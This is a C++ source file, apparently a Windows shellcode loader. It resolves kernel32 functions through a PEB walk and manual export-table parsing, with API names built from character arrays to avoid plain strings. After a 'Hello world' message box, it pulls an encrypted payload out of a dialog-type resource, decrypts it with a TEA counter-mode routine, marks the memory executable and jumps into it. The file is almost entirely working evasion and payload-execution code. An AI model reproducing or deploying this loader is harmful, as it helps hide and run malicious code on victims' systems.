#include <windows.h>
#include <cstdint>

#ifdef _WIN64
extern "C" DWORD64 GetK32();
#define GetK32Proc GetK32Proc64
DWORD64 GetK32Proc64(const char* proc);
#else
#define GetK32Proc GetK32Proc32
DWORD GetK32Proc32(const char* proc);
#endif

typedef HMODULE(WINAPI* LoadLibraryA_t)(
	LPCSTR lpLibFileName
	);
typedef FARPROC(WINAPI* GetProcAddress_t)(
	HMODULE hModule,
	LPCSTR  lpProcName
	);
typedef int(WINAPI* MessageBoxA_t)(
	HWND   hWnd,
	LPCSTR lpText,
	LPCSTR lpCaption,
	UINT   uType
	);
typedef HMODULE(WINAPI* GetModuleHandleA_t)(
	LPCSTR lpModuleName
	);
typedef HRSRC(WINAPI* FindResourceA_t)(
	HMODULE hModule,
	LPCSTR  lpName,
	LPCSTR  lpType
	);
typedef HGLOBAL(WINAPI* LoadResource_t)(
	HMODULE hModule,
	HRSRC   hResInfo
	);
typedef LPVOID(WINAPI* LockResource_t)(
	HGLOBAL hResData
	);
typedef BOOL(WINAPI* VirtualProtect_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

static void mytea(uint8_t* data, size_t size, uint8_t key[16]);

struct payload_header
{
	uint8_t key[16];
	uint32_t size;
};

void shellcode() {
	const char MessageBoxA_s[] = { 'M','e','s','s','a','g','e','B','o','x','A',0 };
	const char Hello_world_s[] = { 'H','e','l','l','o',' ','w','o','r','l','d',0 };
	const char LoadLibraryA_s[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	const char user32dll_s[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
	const char GetProcAddress_s[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };

	LoadLibraryA_t MyLoadLibrary = (LoadLibraryA_t)GetK32Proc(LoadLibraryA_s);
	GetProcAddress_t MyGetProcAddress = (GetProcAddress_t)GetK32Proc(GetProcAddress_s);

	MessageBoxA_t MyMessageBoxA = (MessageBoxA_t)MyGetProcAddress(MyLoadLibrary(user32dll_s), MessageBoxA_s);

	MyMessageBoxA(0, Hello_world_s, 0, 0);

	const volatile char GetModuleHandleA_s[] = { 'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A',0 };
	const char FindResourceA_s[] = { 'F','i','n','d','R','e','s','o','u','r','c','e','A',0 };
	const char LoadResource_s[] = { 'L','o','a','d','R','e','s','o','u','r','c','e',0 };
	const char LockResource_s[] = { 'L','o','c','k','R','e','s','o','u','r','c','e',0 };
	const char _04_s[] = { '1','0','4',0 };
	const char VirtualProtect_s[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0 };

	GetModuleHandleA_t MyGetModuleHandleA = (GetModuleHandleA_t)GetK32Proc((const char*)GetModuleHandleA_s);
	FindResourceA_t MyFindResourceA = (FindResourceA_t)GetK32Proc(FindResourceA_s);
	LoadResource_t MyLoadResource = (LoadResource_t)GetK32Proc(LoadResource_s);
	LockResource_t MyLockResource = (LockResource_t)GetK32Proc(LockResource_s);
	VirtualProtect_t MyVirtualProtect = (VirtualProtect_t)GetK32Proc(VirtualProtect_s);

	HMODULE h = MyGetModuleHandleA(0);
	HRSRC r = MyFindResourceA(h, _04_s, MAKEINTRESOURCEA(RT_DIALOG));
	if (!r)return;
	HGLOBAL rc = MyLoadResource(h, r);
	if (!rc)return;
	BYTE* data = (BYTE*)MyLockResource(rc);
	if (!data)return;

	payload_header* header = (payload_header*)data;

	DWORD old;
	if (!MyVirtualProtect(data, header->size + sizeof payload_header, PAGE_READWRITE, &old))return;

	mytea(data + sizeof payload_header, header->size, header->key);

	if (!MyVirtualProtect(data, header->size + sizeof payload_header, PAGE_EXECUTE_READ, &old))return;

	((void(*)())(void*)(data + sizeof payload_header))();
}

static uint64_t tea_encrypt(uint64_t v, uint32_t* k) {
	uint32_t v0 = ((uint32_t*)&v)[0], v1 = ((uint32_t*)&v)[1], sum = 0;
	uint32_t delta = 0x9e3779b9;
	uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
	for (int i = 0; i < 32; i++) {
		sum += delta;
		v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
		v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
	}

	uint64_t result = 0;
	((uint32_t*)&result)[0] = v0;
	((uint32_t*)&result)[1] = v1;
	return result;
}

static void mytea(uint8_t* data, size_t size, uint8_t key[16]) {
	uint64_t counter = *(uint64_t*)key;

	for (size_t offset = 0; offset < size; offset += 8, ++counter) {
		size_t remaining = size - offset;

		if (remaining >= 8) {
			(*(uint64_t*)(data + offset)) ^= tea_encrypt(counter, (uint32_t*)key);
		}
		else {
			uint8_t temp[8]{};
			for (int i = 0; i < remaining; ++i)temp[i] = (data + offset)[i];
			(*(uint64_t*)temp) ^= tea_encrypt(counter, (uint32_t*)key);
			for (int i = 0; i < remaining; ++i)(data + offset)[i] = temp[i];
		}
	}
}

#ifdef _WIN64
DWORD64 GetK32Proc64(const char* proc) {
	DWORD64 k32 = GetK32();

	DWORD e_lfanew = *(DWORD*)(k32 + 60);

	DWORD export_rva = *(DWORD*)(k32 + e_lfanew + 136);

	DWORD AddressOfFunctions = *(DWORD*)(k32 + export_rva + 28);
	DWORD AddressOfNames = *(DWORD*)(k32 + export_rva + 32);
	DWORD AddressOfNameOrdinals = *(DWORD*)(k32 + export_rva + 36);

	DWORD* AddressOfFunctions_va = (DWORD*)(k32 + AddressOfFunctions);
	DWORD* AddressOfNames_va = (DWORD*)(k32 + AddressOfNames);
	WORD* AddressOfNameOrdinals_va = (WORD*)(k32 + AddressOfNameOrdinals);

	DWORD NumberOfNames = *(DWORD*)(k32 + export_rva + 24);
	for (size_t i = 0; i < NumberOfNames; i++) {
		const char* func = (const char*)(k32 + AddressOfNames_va[i]);

		const char* _proc = proc;
		while (*func && (*func == *_proc)) {
			func++;
			_proc++;
		}

		if (*(unsigned char*)func - *(unsigned char*)_proc == 0) {
			return k32 + AddressOfFunctions_va[AddressOfNameOrdinals_va[i]];
		}
	}
	return 0;
}
#else
DWORD GetK32Proc32(const char* proc) {
	DWORD k32 = 0;
	__asm
	{
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0xc];
		mov eax, [eax + 0x14];
		mov eax, [eax];
		mov eax, [eax];
		mov eax, [eax + 0x10];
		mov k32, eax;
	}

	DWORD e_lfanew = *(DWORD*)(k32 + 60);

	DWORD export_rva = *(DWORD*)(k32 + e_lfanew + 120);

	DWORD AddressOfFunctions = *(DWORD*)(k32 + export_rva + 28);
	DWORD AddressOfNames = *(DWORD*)(k32 + export_rva + 32);
	DWORD AddressOfNameOrdinals = *(DWORD*)(k32 + export_rva + 36);

	DWORD* AddressOfFunctions_va = (DWORD*)(k32 + AddressOfFunctions);
	DWORD* AddressOfNames_va = (DWORD*)(k32 + AddressOfNames);
	WORD* AddressOfNameOrdinals_va = (WORD*)(k32 + AddressOfNameOrdinals);

	DWORD NumberOfNames = *(DWORD*)(k32 + export_rva + 24);
	for (size_t i = 0; i < NumberOfNames; i++) {
		const char* func = (const char*)(k32 + AddressOfNames_va[i]);

		const char* _proc = proc;
		while (*func && (*func == *_proc)) {
			func++;
			_proc++;
		}

		if (*(unsigned char*)func - *(unsigned char*)_proc == 0) {
			return k32 + AddressOfFunctions_va[AddressOfNameOrdinals_va[i]];
		}
	}
	return 0;
}
#endif
